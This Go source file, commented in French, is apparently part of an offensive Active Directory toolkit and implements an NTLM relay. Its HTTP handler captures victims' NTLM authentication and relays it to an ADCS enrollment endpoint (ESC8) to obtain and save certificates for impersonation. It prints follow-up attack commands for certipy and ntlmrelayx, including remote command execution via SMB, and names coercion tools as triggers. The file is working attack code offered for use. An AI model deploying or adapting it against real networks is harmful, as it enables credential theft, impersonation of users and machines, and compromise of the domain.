// pkg/ntlm/relay/relay.go
//
// NTLM Relay natif Go
//
// ⚠️  LIMITATIONS CONNUES :
//   - Le relay TCP générique (SMB→SMB, LDAP) est un forwarder transparent.
//     Il ne parse pas le handshake NTLM pour le manipuler.
//     Pour un vrai relay SMB/LDAP : utiliser ntlmrelayx (impacket).
//
//   - Le relay HTTP → ADCS (ESC8) est fonctionnel : il capture le NTLM
//     Negotiate/Challenge/Auth et le relaie vers /certsrv/certfnsh.asp.
//
//   - MIC (Message Integrity Code) : non géré. Les DCs modernes avec
//     RequireSecuritySignature rejettent les relays sans MIC valide.
//
// Recommandations par cible :
//   ADCS (ESC8) → adgo relay --type adcs  ✓ fonctionnel
//   LDAP relay  → ntlmrelayx.py -t ldap://DC  (impacket recommandé)
//   SMB relay   → ntlmrelayx.py -t smb://TARGET  (impacket recommandé)

package relay

import (
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

// RelayTarget type de cible du relay
type RelayTarget int

const (
	TargetLDAP RelayTarget = iota
	TargetSMB
	TargetHTTP // ADCS web enrollment — seule cible pleinement supportée
)

// RelayConfig configuration du relay
type RelayConfig struct {
	ListenAddr  string
	TargetAddr  string
	TargetType  RelayTarget
	TargetHTTPS bool
	NoMIC       bool
	Command     string // commande à exécuter après relay SMB (non implémenté nativement)
	OnSuccess   func(session *RelaySession)
	Verbose     bool
}

// RelaySession session obtenue après relay réussi
type RelaySession struct {
	VictimIP   string
	VictimUser string
	TargetAddr string
	TargetType RelayTarget
	Conn       net.Conn
	HTTPClient *http.Client
	StartedAt  time.Time
}

// RelayServer serveur de relay NTLM
type RelayServer struct {
	cfg      *RelayConfig
	listener net.Listener
	mu       sync.Mutex
	sessions []*RelaySession
	stopped  bool
}

func NewRelayServer(addr string) *RelayServer {
	return &RelayServer{cfg: &RelayConfig{ListenAddr: addr}}
}

func NewRelayServerFull(cfg *RelayConfig) *RelayServer {
	return &RelayServer{cfg: cfg}
}

// Start démarre le relay en affichant les limitations selon le type de cible.
func (rs *RelayServer) Start() error {
	rs.printCapabilities()

	switch rs.cfg.TargetType {
	case TargetHTTP:
		return rs.startHTTPRelay()
	case TargetLDAP, TargetSMB:
		return rs.startTCPRelayWithWarning()
	default:
		return rs.startHTTPRelay()
	}
}

// printCapabilities affiche ce qui est supporté vs ce qui ne l'est pas.
func (rs *RelayServer) printCapabilities() {
	switch rs.cfg.TargetType {
	case TargetHTTP:
		fmt.Println("[+] Relay type: ADCS HTTP (ESC8) — fully supported")
		fmt.Println("[*] Will capture NTLM handshake and relay to /certsrv/certfnsh.asp")
		fmt.Println("[*] Trigger with: PetitPotam, PrinterBug, Responder, mitm6")

	case TargetLDAP:
		fmt.Println()
		fmt.Println("╔══════════════════════════════════════════════════════════════╗")
		fmt.Println("║           ⚠️  LDAP RELAY — LIMITED SUPPORT                  ║")
		fmt.Println("╠══════════════════════════════════════════════════════════════╣")
		fmt.Println("║  This implementation is a TCP forwarder, not a true NTLM    ║")
		fmt.Println("║  relay. It cannot manipulate the NTLM handshake.            ║")
		fmt.Println("║                                                              ║")
		fmt.Println("║  For a working LDAP relay, use impacket:                    ║")
		fmt.Printf("║  ntlmrelayx.py -t ldap://%s --no-smb-server\n",
			padRight(rs.cfg.TargetAddr, 24))
		fmt.Println("║                                                              ║")
		fmt.Println("║  Starting TCP forwarder anyway (may work in some configs)   ║")
		fmt.Println("╚══════════════════════════════════════════════════════════════╝")
		fmt.Println()

	case TargetSMB:
		fmt.Println()
		fmt.Println("╔══════════════════════════════════════════════════════════════╗")
		fmt.Println("║           ⚠️  SMB RELAY — LIMITED SUPPORT                   ║")
		fmt.Println("╠══════════════════════════════════════════════════════════════╣")
		fmt.Println("║  SMB→SMB relay requires SMB signing to be disabled on the   ║")
		fmt.Println("║  target. This implementation is a TCP forwarder.            ║")
		fmt.Println("║                                                              ║")
		fmt.Println("║  For a working SMB relay, use impacket:                     ║")
		fmt.Printf("║  ntlmrelayx.py -t smb://%s -c \"whoami\"\n",
			padRight(rs.cfg.TargetAddr, 24))
		fmt.Println("║                                                              ║")
		fmt.Println("║  Starting TCP forwarder anyway (may work in some configs)   ║")
		fmt.Println("╚══════════════════════════════════════════════════════════════╝")
		fmt.Println()
	}
}

// ============================================================
// HTTP Relay (ESC8 — ADCS) — implémentation complète
// ============================================================

func (rs *RelayServer) startHTTPRelay() error {
	mux := http.NewServeMux()
	mux.HandleFunc("/", rs.handleHTTPRelay)

	srv := &http.Server{
		Addr:         rs.cfg.ListenAddr,
		Handler:      mux,
		ReadTimeout:  30 * time.Second,
		WriteTimeout: 30 * time.Second,
	}

	fmt.Printf("[*] NTLM Relay (HTTP/ADCS) listening on %s\n", rs.cfg.ListenAddr)
	fmt.Printf("[*] Relaying to: %s\n", rs.cfg.TargetAddr)

	return srv.ListenAndServe()
}

// handleHTTPRelay gère le handshake NTLM en 3 étapes.
func (rs *RelayServer) handleHTTPRelay(w http.ResponseWriter, r *http.Request) {
	auth := r.Header.Get("Authorization")

	// Étape 1 : pas d'auth → demander NTLM
	if auth == "" {
		w.Header().Set("WWW-Authenticate", "NTLM")
		w.Header().Set("Connection", "keep-alive")
		w.WriteHeader(http.StatusUnauthorized)
		return
	}

	if !strings.HasPrefix(auth, "NTLM ") {
		w.WriteHeader(http.StatusUnauthorized)
		return
	}

	b64 := strings.TrimPrefix(auth, "NTLM ")
	msgBytes, err := base64.StdEncoding.DecodeString(b64)
	if err != nil {
		http.Error(w, "bad NTLM", http.StatusBadRequest)
		return
	}

	msgType := ntlmMessageType(msgBytes)

	if rs.cfg.Verbose {
		fmt.Printf("[*] NTLM Type %d from %s\n", msgType, r.RemoteAddr)
	}

	switch msgType {
	case 1: // Negotiate → obtenir le Challenge de la cible
		challenge, err := rs.relayNegotiateHTTP(msgBytes)
		if err != nil {
			fmt.Printf("[-] Relay negotiate failed: %v\n", err)
			http.Error(w, "relay negotiate failed", http.StatusInternalServerError)
			return
		}
		encoded := base64.StdEncoding.EncodeToString(challenge)
		w.Header().Set("WWW-Authenticate", "NTLM "+encoded)
		w.Header().Set("Connection", "keep-alive")
		w.WriteHeader(http.StatusUnauthorized)

	case 3: // Auth → relayer vers la cible
		victimIP := extractIP(r.RemoteAddr)
		victimUser := extractUsernameFromNTLMAuth(msgBytes)

		fmt.Printf("[*] Relaying NTLM Auth from %s (user: %s)\n", victimIP, victimUser)

		if err := rs.relayAuthHTTP(msgBytes, victimIP, victimUser, w); err != nil {
			fmt.Printf("[-] Relay auth failed from %s: %v\n", victimIP, err)
			http.Error(w, "relay failed", http.StatusUnauthorized)
		}
	}
}

// relayNegotiateHTTP envoie le Negotiate à la cible et récupère le Challenge.
func (rs *RelayServer) relayNegotiateHTTP(negotiate []byte) ([]byte, error) {
	targetURL := rs.buildTargetURL("")

	client := rs.buildHTTPClient()
	req, err := http.NewRequest("GET", targetURL, nil)
	if err != nil {
		return nil, fmt.Errorf("request creation failed: %v", err)
	}
	req.Header.Set("Authorization", "NTLM "+base64.StdEncoding.EncodeToString(negotiate))
	req.Header.Set("Connection", "keep-alive")

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("negotiate request to target failed: %v", err)
	}
	defer resp.Body.Close()

	wwwAuth := resp.Header.Get("WWW-Authenticate")
	if !strings.HasPrefix(wwwAuth, "NTLM ") {
		return nil, fmt.Errorf("target did not return NTLM challenge (got: %q) — target may not support NTLM", wwwAuth)
	}

	challenge, err := base64.StdEncoding.DecodeString(strings.TrimPrefix(wwwAuth, "NTLM "))
	if err != nil {
		return nil, fmt.Errorf("challenge decode failed: %v", err)
	}

	if rs.cfg.Verbose {
		fmt.Printf("[*] Got NTLM Challenge from target (%d bytes)\n", len(challenge))
	}

	return challenge, nil
}

// relayAuthHTTP relaie le message Auth vers la cible ADCS et extrait le certificat.
func (rs *RelayServer) relayAuthHTTP(auth []byte, victimIP, victimUser string, w http.ResponseWriter) error {
	// Pour ADCS : envoyer vers certfnsh.asp
	targetURL := rs.buildTargetURL("/certsrv/certfnsh.asp")

	client := rs.buildHTTPClient()

	body := "Mode=newreq&CertRequest=&CertAttrib=CertificateTemplate%3AUser&TargetStoreFlags=0&SaveCert=yes"
	req, err := http.NewRequest("POST", targetURL, strings.NewReader(body))
	if err != nil {
		return fmt.Errorf("request creation failed: %v", err)
	}
	req.Header.Set("Authorization", "NTLM "+base64.StdEncoding.EncodeToString(auth))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("Connection", "keep-alive")

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("auth relay to target failed: %v", err)
	}
	defer resp.Body.Close()

	respBody, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<20)) // max 1MB

	if resp.StatusCode == http.StatusOK {
		fmt.Printf("\n[+] ════════════════════════════════════════════════════\n")
		fmt.Printf("[+] NTLM RELAY SUCCESS from %s (user: %s)\n", victimIP, victimUser)
		fmt.Printf("[+] ════════════════════════════════════════════════════\n")

		// Tenter d'extraire le certificat
		cert := extractCertFromADCSResponse(string(respBody))
		if cert != "" {
			certFile := fmt.Sprintf("relay_%s_cert.b64", strings.ReplaceAll(victimIP, ".", "_"))
			if err := os.WriteFile(certFile, []byte(cert), 0600); err == nil {
				fmt.Printf("[+] Certificate saved to: %s\n", certFile)
				fmt.Printf("[*] Authenticate with: certipy auth -pfx %s -dc-ip <DC_IP>\n", certFile)
			}
		} else {
			fmt.Println("[!] Certificate not extracted from response — check manually")
			fmt.Printf("[*] Response body (first 500 chars):\n%s\n", truncateStr(string(respBody), 500))
		}

		rs.mu.Lock()
		session := &RelaySession{
			VictimIP:   victimIP,
			VictimUser: victimUser,
			TargetAddr: rs.cfg.TargetAddr,
			TargetType: TargetHTTP,
			StartedAt:  time.Now(),
		}
		rs.sessions = append(rs.sessions, session)
		rs.mu.Unlock()

		if rs.cfg.OnSuccess != nil {
			rs.cfg.OnSuccess(session)
		}

		w.WriteHeader(http.StatusOK)
		fmt.Fprintf(w, "RELAY_SUCCESS")
		return nil
	}

	return fmt.Errorf("relay returned HTTP %d — relay failed or target rejected auth", resp.StatusCode)
}

func (rs *RelayServer) buildTargetURL(path string) string {
	scheme := "http"
	if rs.cfg.TargetHTTPS {
		scheme = "https"
	}
	target := rs.cfg.TargetAddr
	if !strings.Contains(target, "/") {
		target = target + path
	}
	if strings.HasPrefix(target, "http") {
		return target
	}
	return scheme + "://" + target
}

func (rs *RelayServer) buildHTTPClient() *http.Client {
	return &http.Client{
		Timeout: 15 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
}

// ============================================================
// TCP Relay — forwarder transparent (avec avertissement)
// ============================================================

func (rs *RelayServer) startTCPRelayWithWarning() error {
	ln, err := net.Listen("tcp", rs.cfg.ListenAddr)
	if err != nil {
		return fmt.Errorf("relay listen failed on %s: %v", rs.cfg.ListenAddr, err)
	}
	rs.listener = ln
	defer ln.Close()

	fmt.Printf("[*] TCP forwarder listening on %s → %s\n",
		rs.cfg.ListenAddr, rs.cfg.TargetAddr)
	fmt.Println("[*] Note: This is a transparent forwarder, not a true NTLM relay")

	for {
		conn, err := ln.Accept()
		if err != nil {
			if rs.stopped {
				return nil
			}
			continue
		}
		go rs.handleTCPRelay(conn)
	}
}

func (rs *RelayServer) handleTCPRelay(client net.Conn) {
	defer client.Close()

	target, err := net.DialTimeout("tcp", rs.cfg.TargetAddr, 10*time.Second)
	if err != nil {
		fmt.Printf("[-] Cannot reach target %s: %v\n", rs.cfg.TargetAddr, err)
		return
	}
	defer target.Close()

	victimIP := extractIP(client.RemoteAddr().String())
	if rs.cfg.Verbose {
		fmt.Printf("[*] Forwarding %s → %s\n", victimIP, rs.cfg.TargetAddr)
	}

	done := make(chan struct{}, 2)
	go func() {
		io.Copy(target, client)
		done <- struct{}{}
	}()
	go func() {
		io.Copy(client, target)
		done <- struct{}{}
	}()
	<-done
}

func (rs *RelayServer) Stop() {
	rs.stopped = true
	if rs.listener != nil {
		rs.listener.Close()
	}
}

func (rs *RelayServer) Sessions() []*RelaySession {
	rs.mu.Lock()
	defer rs.mu.Unlock()
	return rs.sessions
}

// ============================================================
// Helpers
// ============================================================

func ntlmMessageType(msg []byte) int {
	if len(msg) < 12 {
		return 0
	}
	if string(msg[:8]) != "NTLMSSP\x00" {
		return 0
	}
	return int(msg[8])
}

func extractUsernameFromNTLMAuth(msg []byte) string {
	if len(msg) < 72 {
		return ""
	}
	userLen := int(uint16(msg[36]) | uint16(msg[37])<<8)
	userOffset := int(uint32(msg[40]) | uint32(msg[41])<<8 | uint32(msg[42])<<16 | uint32(msg[43])<<24)
	if userOffset+userLen > len(msg) || userLen == 0 {
		return ""
	}
	raw := msg[userOffset : userOffset+userLen]
	var sb strings.Builder
	for i := 0; i+1 < len(raw); i += 2 {
		if raw[i+1] == 0 && raw[i] >= 0x20 {
			sb.WriteByte(raw[i])
		}
	}
	return sb.String()
}

func extractCertFromADCSResponse(body string) string {
	// Chercher le certificat dans la réponse ADCS
	markers := [][]string{
		{"-----BEGIN CERTIFICATE-----", "-----END CERTIFICATE-----"},
		{"-----BEGIN PKCS7-----", "-----END PKCS7-----"},
	}
	for _, m := range markers {
		start := strings.Index(body, m[0])
		if start < 0 {
			continue
		}
		end := strings.Index(body[start:], m[1])
		if end > 0 {
			return body[start : start+end+len(m[1])]
		}
	}
	return ""
}

func extractIP(addr string) string {
	host, _, err := net.SplitHostPort(addr)
	if err != nil {
		return addr
	}
	return host
}

func padRight(s string, width int) string {
	if len(s) >= width {
		return s[:width]
	}
	return s + strings.Repeat(" ", width-len(s))
}

func truncateStr(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max-3] + "..."
}
